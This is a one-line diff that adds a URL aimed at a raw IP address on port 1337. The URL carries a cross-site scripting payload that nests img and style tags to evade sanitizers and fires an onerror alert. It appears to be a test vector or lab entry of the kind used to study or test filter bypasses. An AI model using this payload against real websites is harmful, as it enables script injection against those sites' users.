@@ -1,0 +1,1 @@
+http://20.115.83.90:1337/?xss=<img src="<style>"><style></style>" onerror="alert('XSS!')" a='<img src="'">
